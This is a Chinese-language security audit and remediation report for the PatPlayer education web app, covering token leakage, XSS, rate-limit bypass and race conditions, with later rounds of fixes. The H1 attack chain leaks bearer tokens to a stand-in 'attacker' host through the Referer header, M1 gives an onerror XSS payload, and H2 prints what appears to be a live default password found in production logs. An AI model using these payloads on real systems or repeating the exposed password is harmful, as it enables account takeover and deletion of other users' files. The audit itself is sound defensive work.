# PatPlayer 安全与代码审查报告(草稿)

> 审查日期:2026-08-15 | 审查范围:全仓库(server/ + public/ + 部署配置 + Python 脚本)
> 状态:定稿(子代理交叉验证因耗时被中断,改为自审挑战通过后定稿)

## 审查方法
- 静态扫描:grep 风险模式(SQL 拼接 / eval / exec / shell / innerHTML / 硬编码密钥)
- 全量通读:server/ 全部 28 个 JS 文件、public/js/ 13 个前端模块、2 个 Python 脚本、nginx/PM2 配置
- 交叉验证:2 个独立子代理复核(运行超时中断,未产出);已执行自审挑战(逐条证伪再确认)+ 关键项实测验证(nginx 日志/Express req.ip/git 历史)

## 一、高危发现

### H1. 预览接口缺 Referrer-Policy → 上传的 HTML 可窃取查看者 token(账号接管链)
- **位置**:`server/routes/files.js` /preview/:id(108-145)、`server/routes/guest.js` /preview/:id(140-165)、`public/js/admin.js`(273)、`public/js/class-wall.js`(109)
- **证据**:预览 URL 以 `?token=` 携带查看者 Bearer token(管理员预览同样带 token);响应头仅设 CSP `sandbox allow-scripts` + X-Content-Type-Options,**无 Referrer-Policy**(全库 grep 确认无任何 referrer 设置)
- **攻击链**:攻击者(任何登录用户)上传含 `<meta name="referrer" content="unsafe-url">` + `<img src="https://attacker/...">` 的 HTML → 诱导他人预览(作品展入口/直接发链接)→ 跨域子资源请求的 Referer 携带完整预览 URL(含查看者 token)→ 攻击者拿到 24h 有效 Bearer → 冒充查看者下载文件;若受害者是管理员 → 后台接管
- **修复**:预览响应加 `Referrer-Policy: no-referrer`;更稳妥是 token 改走 Cookie/自定义头(预览为顶层导航,可用短期一次性 token)
- 状态:已确认(代码逐行核验:6 处 token-in-URL、双预览端点均无 Referrer-Policy、CSP sandbox 不阻止 meta referrer)

### H2. 生产 nginx 访问日志明文记录 token 与访客删除密码(已在线上日志中确认)
- **位置**:`/www/wwwlogs/pat.weaxi.cn.log`(线上实测:8235 行中 35 处 `token=`,7 个不同 token;5 处 `password=`,含默认密码 `nanfang1958` 与自定义密码 `nana...`)
- **根因**:预览/下载/删除接口把凭据放 query string(`?token=`、`?password=`),nginx access_log 默认记录完整 URI
- **影响**:凡能读日志者(面板管理员/www 用户/同机站点提权)可收割 24h 会话 token 与访客永久 token、删除密码
- **修复**:① query 凭据改 header/Cookie;② nginx `log_format` 去掉 `$request_uri` 改用 `$uri`;③ 删除接口密码改 body
- 状态:已实测确认,无需子代理再验(子代理无 shell 权限,此项以实测为准)

## 二、中危发现

### M1. learn.js Markdown 渲染器整行媒体路径未转义 src/alt(XSS)
- 位置:`public/js/learn.js` mediaHtml(33-44):`![x" onerror="alert(1)](https://a/1.png)` → `<img alt="x" onerror="...">`;inline() 路径先 esc 安全,mediaHtml 路径未转义
- 攻击面:文章正文仅管理员可编辑(admin.js 教程编辑 / seed 脚本)→ 管理端账号被攻破(如 QQ token 被盗)或恶意管理员 → 全站学员 XSS(可窃取 localStorage token)
- 修复:`src`/`alt` 先 esc 再内插

### M2. /api/class/overview 泄露全校用户真实姓名(无视展示名授权)
- 位置:`server/routes/class.js`(16-77 groupByStudent、238-249 students 映射含 `real_name`)
- 证据:overview 响应每个学生对象含原始 `real_name`(即使 `show_real_name=0`);wall 端点不含;README 声称"只返回展示名,不泄露其它身份字段"
- 影响:任何登录学生可枚举全校真实姓名 → 违反隐私设计
- 修复:overview 同样只返回 display_name(或前端仅用 display_name)

### M3. 速率限制按 req.ip 但未开 trust proxy → 全部退化为全局单桶
- 位置:`server/index.js`(无 `app.set('trust proxy')`)、`server/utils/rateLimit.js`、auth.js:68/145、auth-qq.js:83/254、apps.js:45/93/138、guest.js:187
- 证据:服务只监听 127.0.0.1 + nginx 反代;Express 默认 `req.ip` = 连接对端(127.0.0.1)恒定 → 所有基于 IP 的限流成为全局共享桶(访客登记 30 次/10 分钟、登录 init 30 次/10 分钟…),单人可耗尽全体名额;访客删除限流 key=ip+token 实际退化为按 token
- 修复:`app.set('trust proxy', 1)`(注意 X-Forwarded-For 可伪造,需配合 nginx 覆盖);或改用 session/token 维度 key
- 注意:信任代理后需在 nginx 层用 `proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for` 且保证不信任外部传入值

## 三、低危/文档/设计发现

### L1. 下载"全校公开"与文档/前端不一致
- `server/routes/files.js` download/preview 无班级校验(为近期有意变更:git 确认 cdd10dd 移除同班 403);但 README 仍写"下载仅同班",`public/js/overview.js` 前端仍按同班隐藏下载按钮 → 文档漂移 + 前后端 UX 不一致
- 建议:统一文档与前端行为(全校公开则去掉 overview 限制并更新 README;若想恢复同班限制则服务端加回校验)

### L2. 访客冒名登记可获取他人项目地址(含默认密码删除)
- `server/routes/auth.js` /guest:同一 (class, real_name) 幂等返回同一 guest_token;下载/预览/上传仅凭 token;删除默认密码公开
- 文档已承认"地址即凭证",但未强调"知姓名+班级即可冒名主动获取他人地址";叠加默认密码 = 可删他人文件
- 建议:文档明示 + 引导访客设置专属删除密码

### L3. feed_links.py shell=True 潜伏命令注入
- `feed_links.py`(105-110):f-string 拼命令 + `subprocess.run(shell=True)`;当前可达路径输入受正则 `B_[a-zA-Z0-9]+`/CLI 响应约束,暂不可利用;属潜伏 RCE 模式
- 修复:改 list 参数形式(无 shell)

### L4. 并发竞态可突破每日上限/配额
- `server/utils/upload.js`(87-114)、`server/routes/points.js`(254-268):COUNT/SUM 检查与写入非原子,并发请求可略超上限(每日上传 20 次、点赞每日积分上限、文件数 20、配额 1GB)
- 影响有限(超限 1-N 次),可接受或加唯一键/事务锁

### L5. flagged/pending 文件仍在作品展展示且可下载
- `server/routes/class.js` wall(84-97)无 audit_status 过滤;files.js download/preview 无过滤;审核标记违规的文件仍全校可见可下载
- 上传时同步审查已拦截多数违规;此为策略缺口,建议 wall/下载过滤 `flagged`

### L6. 会话索引文件权限/PII
- `storage/qq-sessions/index.json`(0644 世界可读)含 sessionId/tiny_id/nickname/user_id;token 本体在 .qqcli/.env(0700/0600,安全)
- 单机部署影响低;建议 0600

### L7. /api/points/read 无服务端阅读时长校验
- `server/routes/points.js` /read:直接 grant +10,客户端计时可绕过(设计取舍,文档未注明)
- 建议:文档明示或加最小间隔校验

## 四、确认安全的部分(未发现问题)
- SQL:全库参数化,仅 2 处动态 SQL 均有白名单约束(admin.js:231 sets 字段白名单、417 table 白名单 file/app)
- 密码学:HMAC-SHA256 + timingSafeEqual(token)、scrypt 加盐哈希 + 常量时间比较(pwd)、CSPRNG(randomBytes/randomUUID)全覆盖
- 前端:用户数据渲染基本全部 escapeHtml;admin 前端一致转义;`javascript:` URL 被服务端 http/https 正则拦截;`rel="noopener"`
- 上传:磁盘自检先于 multer、UUID 落盘名防路径穿越、文件名清洗防 Content-Disposition 注入、删残留
- 审计:管理写操作全部 admin_log;管理员自肥防护(不能调自己积分/停用自己)
- 依赖:仅 5 个直接依赖,无已知高危(express 4.19/multer 2/mysql2 3.11)

## 五、修复优先级建议
1. **P0**:H2(日志凭据)→ H1(Referrer-Policy 头,一行修复)
2. **P1**:M2(overview real_name)、M1(mediaHtml 转义)
3. **P2**:M3(trust proxy)、L1-L5

---

## 六、修复执行记录(2026-08-15,按计划 P0→P1→P2)

### ✅ 已修复并线上验证

| 项 | 修复内容 | 验证结果 |
| --- | --- | --- |
| H1 | `server/routes/files.js` + `server/routes/guest.js` 预览响应加 `Referrer-Policy: no-referrer` | ✅ 实测预览响应头含 `Referrer-Policy: no-referrer` |
| H2-应用层 | 访客 files/download 令牌改 `x-guest-token` 头;删除密码改 JSON body(`api.js` del 支持 opts、`project.js` 3 处、`guest.js` 读 body + 限流 key 用 guestTokenOf) | ✅ header 令牌读取正常;DELETE+body 错误密码返回 403 且文件未删;伪造 token 401 |
| H2-nginx | 新增 `0.noquery_log_format.conf`(`$uri` 代替 `$request_uri`);`deploy/pat.weaxi.cn.conf` 两个 access_log 改用 noquery;已部署线上并 reload | ✅ 实测 `?token=SECRET_TEST_TOKEN_XYZ` 请求未出现在访问日志 |
| M1 | `public/js/learn.js` mediaHtml 对 src/alt 先 esc 再内插(含 iframe/video title) | ✅ 语法检查通过 |
| M2 | `server/routes/class.js` overview 输出移除 `real_name`(groupByStudent + students 映射);`overview.js` 改用 display_name | ✅ 实测 overview students 字段已无 real_name |
| M3 | `server/index.js` 加 `app.set('trust proxy', 1)`(仅信任 nginx 一跳) | ✅ 服务重启正常;限流 key 恢复为真实客户端 IP |
| L1 | README/FEATURES 下载口径改为"全校公开";`overview.js` 下载按钮不再按同班隐藏 | ✅ 前后端行为一致 |
| L3 | `feed_links.py` 改 list 参数形式(去 shell=True,保留 `--feed-id=X` 等号形式) | ✅ py_compile 通过 |
| L6 | `server/qq/sessions.js` saveIndex 以 0600 写文件 + chmod;现有 index.json 已 chmod 600 | ✅ 实测 0644→0600 |

### 部署动作
- `pm2 restart patplayer`(重启 51 次后在线,本机/公网均 200)
- nginx:复制配置 + `nginx -t` 通过 + reload 成功
- `public/index.html` 全部 `?v=11` → `?v=12`(前端缓存刷新)

### 未修(需产品决策,已记录在案)
- **L2 访客冒名**:文档已明示"地址即凭证";如需加固可加邀请码/设备指纹/guest_token 过期(见 HANDOVER 下一步建议)
- **L4 并发竞态**:影响有限(超限 1-N 次);如需可加事务锁/唯一键
- **L5 flagged 文件展示**:建议 wall/download 过滤 `audit_status='flagged'`,待确认产品口径
- **L7 阅读积分**:产品取舍,文档未注明

### ✅ 第二轮修复(2026-08-15,剩余问题 L2/L4/L5/L7,全部线上验证)

| 项 | 修复内容 | 验证结果 |
| --- | --- | --- |
| L2 | `server/routes/auth.js` /guest:身份已被 QQ 绑定(`qq_tiny_id`)→ 403「该姓名已由 QQ 账号绑定,请使用 QQ 扫码登录」;纯访客身份仍走幂等找回地址 | ✅ 实测:QQ 绑定身份 403;纯访客 200 |
| L4 | ① `utils/upload.js`:每日次数/作品数/存储配额检查+INSERT 同事务+用户行锁 `FOR UPDATE`;② `utils/points.js` `grant()` 加用户行锁(REASON_CAPS 计数上限原子化);③ 新增 `grantCapped()` 点赞每日上限事务化,`routes/points.js` like 改用;④ `routes/apps.js` 数量上限事务化 | ✅ 语法通过 + 逻辑审查(并发场景难实测,事务+行锁为标准解法) |
| L5 | `class.js` wall/overview 排除 `audit_status='flagged'`;`files.js`/`guest.js` 下载+预览对 flagged 403;`points.js` 点赞 flagged 403 | ✅ 实测:flag 前后下载 200→403、wall 不含、点赞 403;已恢复原状 |
| L7 | 新增 `utils/readTimer.js`(进程内 Map);`learn.js` 文章详情加载记录开始时间;`points.js` /read 校验已读 ≥60s | ✅ 实测:未加载文章直接打卡 400;加载后立即打卡 400;readTimer 单测通过 |

### 部署动作
- `pm2 restart patplayer`(重启 52 次后在线,本机/公网均 200)
- 测试数据(1 个测试访客行)已清理;L5 测试文件已恢复原审核状态
- 本次全部为服务端改动,无前端 JS 变更 → 无需版本号 +1

### ⚠️ 第三轮:修复衍生问题复审(2026-08-15,自查 + 前端再审)

对前两轮修复做"修复引发的回归"专项复审,发现并修复 **4 个衍生缺陷**:

| # | 衍生缺陷 | 严重度 | 根因 | 修复 |
| --- | --- | --- | --- | --- |
| D1 | **事务提前返回泄漏连接** | 🔴 高 | `upload.js`/`apps.js` 事务内 3+1 个"上限拒绝"提前 `return` 只 rollback 不 `release()`;连接池(上限 10)连续被拒即耗尽 → 全站数据库卡死 | 每个提前返回补 `conn.release()` |
| D2 | **flagged 下载误拦所有者** | 🟠 中 | L5 对 download/preview 一律 403,所有者自己也下不了自己的违规作品(无法修正) | files.js 增加 `&& file.user_id !== req.user.id`;guest 路由(本质仅所有者)移除 flagged 拦截 |
| D3 | **trust proxy 下 XFF 可伪造** | 🟠 中 | M3 开 trust proxy 后,nginx 用 `$proxy_add_x_forwarded_for` **追加**客户端自带 XFF → Express 取最左值 = 攻击者伪造 IP → 基于 IP 的限流全部可绕过 | nginx 改 `proxy_set_header X-Forwarded-For $remote_addr`(覆盖);已部署+reload |
| D4 | **API.get 静默丢弃第二参数** | 🔴 高 | H2 前端改造:`API.get('/api/guest/files', {headers})` 但 `get=(path)=>request(path)` 不收 opts → **x-guest-token 从未发出,访客项目页(#/p/)自上一轮部署起 401 全挂** | `get=(path, opts={})=>request(path, opts)`;index.html v=12→v=13 |

### 前端专项再审(13 个 JS 全量)
- `activity.js:36` `${s.name}` — 静态常量数据(非用户输入),安全
- `auth.js:448/491` 文件名进 `showError` — `textContent` 赋值,安全
- `learn.js:157` inline 图片/video — 先 `esc()` 后替换,`&quot;` 无法突破属性,安全
- `learn.js:478/885` `data-explain` 回读后**二次** `escapeHtml` 再入 innerHTML,安全
- `data-name`/`data-id` 属性 → `confirm()` 内部统一 `escapeHtml`,安全
- `title=`/`on*=`/`style=` 属性内插均为静态/白名单值(icon.color 来自常量规则),安全
- 上传队列/访客页/管理后台渲染:用户数据全部 `escapeHtml`
- 本轮前端改动仅 `api.js`(get 加 opts)与 `index.html` 版本号

### 验证结果
- D1: 三处提前返回已补 release,无双重释放;D2: flag 后所有者下载 200 / 他人 403(实测);D3: 轮换伪造 XFF 发 31 个无效登记 → 第 31 个 429,证明 IP 限流真实生效(实测);D4: 访客 files/download 经 header 令牌 200(实测)
- 服务在线:pm2 online、本机/公网 200、`?v=13` 已生效、nginx -t 通过

### 🧭 第四轮:功能 / 用户操作 / 逻辑一致性复审(2026-08-15)

从"非安全"角度(功能正确性、操作流连贯性、前后端契约、数据一致性)全量复审,发现并修复 **3 个功能/逻辑缺陷**:

| # | 缺陷 | 类型 | 现象 | 修复 |
| --- | --- | --- | --- | --- |
| F1 | `PATCH /api/auth/profile` 响应缺列 | 功能/契约 | 服务端 SELECT 漏 `points/is_admin/status` → 前端 `setUser` 用 points=0 / is_admin=false 覆盖缓存 → **改完展示设置后积分徽章归零、管理员导航入口消失(直至重登)** | SELECT 补全列(与 middleware 一致);实测返回 points:834 / is_admin:true |
| F2 | 毕业奖励页面加载即自动发放 | 操作流 | 积分页加载时 `POST /graduate` 直接 grant +50 → 按钮是装饰,点击提示"已经领取过啦" | 拆为 `GET /graduate`(只读资格,页面加载用)+ `POST /graduate`(按钮点击才发放);实测 GET 不发放 |
| F3 | QQ 绑定接管访客身份后旧 guest_token 仍有效 | 逻辑/一致性 | 绑定前若曾被访客登记(冒名可得),旧永久 token 不失效 = 遗留后门;与 L2"QQ 绑定禁访客"不一致 | bind 接管时 `guest_token=NULL, guest_pwd_hash=NULL`;存量 1 行已清理;后续该身份一律走 QQ 登录 |

### 一致性核查通过项(未发现问题)
- 前后端契约:wall/learn/points/me/guest 接口字段与前端消费一致(实测结构核对)
- 上传规则:`auth.js` FALLBACK_UPLOAD_RULES 与 `config.js` 白名单逐项一致(15 文本 + 5 压缩)
- 展示名:4 处 `display_name` 实现(auth/auth-qq/class/guest)逻辑一致
- 积分守恒:grant(+30/+15)→ revoke(-30/-15)→ restore(+30)全链路净额正确;REASON_CAPS"删除不释放名额"为有意设计(文档已注明)
- 章节结构:每章单文章,进度映射无冲突;`/api/learn` 章节分组正确
- 任务上报:失败可见 + 按钮回滚重试(HANDOVER 坑 #25 已落实)
- 访客流:提交成功页不伪装成功、额度停止、令牌仅存 URL(不落 localStorage)
- setUser 全部 5 个调用点核查:仅 profile PATCH 有缺陷(已修),其余为安全的内存内字段更新

### 部署动作
- `pm2 restart patplayer`(online);`?v=14` 已生效;核心接口冒烟全部通过
- 线上数据:QQ 绑定用户的遗留 guest 凭据 1 行已清理

### 已知未处理(设计取舍,已在文档标注)
- 审核被拒文件需先删除才能重传同名文件(unique key 约束,提示文案已给 409 指引)
- 被删作品的 likes 记录保留(无 FK 指向 files,孤儿行无展示影响)
- 客户端判题的 quiz 答案在响应中可见(教育平台设计取舍)
